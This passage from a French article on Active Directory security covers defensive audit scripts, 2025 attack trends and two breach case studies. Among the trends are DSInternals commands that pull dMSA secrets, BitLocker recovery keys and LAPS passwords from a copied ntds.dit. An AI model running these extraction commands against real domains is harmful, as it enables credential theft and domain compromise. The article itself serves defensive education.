    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",  # DS-Replication-Get-Changes
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"   # DS-Replication-Get-Changes-All
)

Get-ADObject -Filter * -SearchBase "DC=corp,DC=local" | ForEach-Object {
    $acl = Get-Acl "AD:$($_.DistinguishedName)"
    $acl.Access | Where-Object {
        $_.ObjectType -in $ReplicationRights -and 
        $_.IdentityReference -notlike "*Domain Controllers*" -and
        $_.IdentityReference -notlike "*Enterprise Admins*"
    } | Select-Object IdentityReference, ObjectType, AccessControlType
}

# Vérification des comptes avec pré-authentification désactivée
Get-ADUser -Filter "DoesNotRequirePreAuth -eq 'True'" -Properties DoesNotRequirePreAuth, PasswordLastSet | 
Select-Object Name, SamAccountName, DoesNotRequirePreAuth, PasswordLastSet, Enabled
```

## Tendances et Évolutions 2025

### Nouvelles Techniques d'Attaque

**Exploitation des Delegated Managed Service Accounts (dMSA) :**

Windows Server 2025 introduit les dMSA, créant de nouveaux vecteurs d'attaque :

```powershell
# Golden dMSA Attack avec DSInternals
Get-ADDBServiceAccount -DatabasePath .\ntds.dit -BootKey $key -Type DelegatedManagedServiceAccount
```

**Attaques sur BitLocker et LAPS :**

L'extraction des clés BitLocker et mots de passe LAPS depuis NTDS.dit devient possible :

```powershell
# Extraction clés BitLocker depuis NTDS.dit
Get-ADDBBitLockerRecoveryKey -DatabasePath .\ntds.dit -BootKey $bootkey

# Extraction mots de passe LAPS
Get-ADDBComputerLocalAdminPassword -DatabasePath .\ntds.dit -BootKey $bootkey
```

### Intelligence Artificielle et Machine Learning

**Détection comportementale avancée :**

Les solutions 2025 intègrent l'IA pour identifier les patterns d'attaque subtils :

* **Analyse temporelle** : Détection des anomalies dans les patterns d'authentification
    
* **Modélisation des utilisateurs** : Profils comportementaux pour identifier les déviations
    
* **Corrélation multi-sources** : Fusion des données réseau, endpoint et AD pour détection holistique
    

**Automatisation de la réponse :**

* **Quarantaine automatique** : Isolation des comptes compromis détectés
    
* **Révocation de tickets** : Invalidation automatique des tickets Kerberos suspects
    
* **Escalade intelligente** : Priorisation des alertes basée sur l'analyse de risque
    

## Études de Cas et Scénarios Réels

### Cas d'Étude 1 : Compromission Enterprise via Kerberoasting

**Contexte :** Organisation de 50,000 utilisateurs avec infrastructure AD complexe

**Vecteur initial :** Email de phishing compromettant un poste utilisateur standard

**Progression de l'attaque :**

1. **Reconnaissance** : Utilisation de BloodHound pour cartographier l'environnement
    
2. **Kerberoasting** : Extraction de 247 comptes de service via Rubeus
    
3. **Craquage** : Compromission de 23 mots de passe faibles en 48 heures
    
4. **Escalade** : Utilisation d'un compte SQL Server avec privilèges DA
    
5. **Persistance** : Création de Golden Tickets et comptes cachés via DCShadow
    

**Impact :** Accès complet à l'infrastructure, exfiltration de 2.3TB de données

**Leçons apprises :**

* Nécessité de politiques de mots de passe renforcées pour les comptes de service
    
* Importance de la surveillance des patterns de demandes TGS
    
* Valeur des Managed Service Accounts pour éliminer les mots de passe statiques
    

### Cas d'Étude 2 : Persistance APT via DCSync et DCShadow

**Contexte :** Attaque APT sophistiquée contre une institution financière

**Techniques utilisées :**

1. **Infiltration initiale** : Exploitation zero-day d'une application web interne
    
2. **Mouvement latéral** : Pass-the-Hash via dumps LSASS automatisés
    
3. **Escalade privilèges** : Exploitation des chemins BloodHound vers Domain Admins
    
4. **Exfiltration données** : DCSync pour extraction complète de la base AD
    
5. **Persistance** : DCShadow pour création de backdoors cachés dans le schéma AD
    

**Durée de compromission :** 18 mois avant détection

**Vecteur de détection :** Anomalie dans les logs de réplication détectée par SIEM

## Recommandations Stratégiques 2025

### Architecture de Sécurité Zero Trust

**Implémentation de la confiance zéro pour AD :**

```powershell
# Configuration Conditional Access basée sur les risques
$Policy = @{
    DisplayName = "AD-HighRisk-Block"
    Conditions = @{
        SignInRiskLevels = @("high", "medium")
        UserRiskLevels = @("high")
        Applications = @("All")
    }
    GrantControls = @{
        Operator = "OR"
        BuiltInControls = @("Block")
    }
}
```

**Microsegmentation réseau :**

* **Isolation des DCs** : VLANs dédiés avec rules de firewall strictes
    
* **Jump boxes sécurisés** : Accès administratif via bastions durcis
    
* **Monitoring réseau** : Détection des communications AD anormales
    

### Feuille de Route de Modernisation

**Phase 1 : Assessment et durcissement (0-3 mois)**

* Audit complet des permissions et configurations AD
    
* Implémentation des MSA/gMSA pour les comptes de service
    
* Déploiement de solutions de monitoring avancées
    

**Phase 2 : Modernisation technique (3-12 mois)**

* Migration vers Windows Server 2025 et fonctionnalités dMSA
    
* Implémentation du modèle de niveaux (Tiering)
    
* Déploiement de Credential Guard sur tous les endpoints
    

**Phase 3 : Intelligence et automation (12-24 mois)**

* Intégration de solutions IA pour détection comportementale
    
* Automatisation de la réponse aux incidents AD
    
* Implémentation de la telemetrie avancée et threat hunting
    

## Conclusion

Les attaques avancées contre Active Directory représentent une menace persistante et en constante évolution pour les organisations modernes. La sophistication croissante des techniques comme le Kerberoasting avancé, les attaques Golden/Silver Ticket, DCSync et DCShadow nécessite une approche de sécurité multicouche combinant prévention, détection et réponse.

L'année 2025 marque un tournant critique dans la sécurité Active Directory avec l'émergence de nouvelles vulnérabilités liées aux dMSA, l'évolution des techniques d'évasion, et l'intégration croissante de l'intelligence artificielle tant du côté des attaquants que des défenseurs. Les organisations doivent adopter une posture proactive combinant modernisation technique, surveillance comportementale et formation des équipes.

La protection efficace contre ces attaques sophistiquées nécessite une compréhension approfondie des mécanismes d'authentification Kerberos, une surveillance continue de l'infrastructure Active Directory, et l'implémentation de contrôles de sécurité adaptés à la réalité opérationnelle de l'organisation. L'adoption du modèle Zero Trust, la modernisation vers les Managed Service Accounts, et l'implémentation de solutions de détection basées sur l'IA représentent les piliers de la résilience AD pour la décennie à venir.

Enfin, il est crucial de comprendre que la sécurité Active Directory n'est pas un état final mais un processus continu d'adaptation aux nouvelles menaces. Les organisations qui investissent dans la formation de leurs équipes, l'implémentation d'outils de détection avancés, et la modernisation de leur architecture AD seront mieux positionnées pour résister aux cyberattaques sophistiquées de demain. La complexité croissante des attaques impose également une collaboration renforcée entre les équipes de sécurité, les administrateurs systèmes et les décideurs stratégiques pour maintenir un niveau de protection adéquat face à ces menaces évolutives.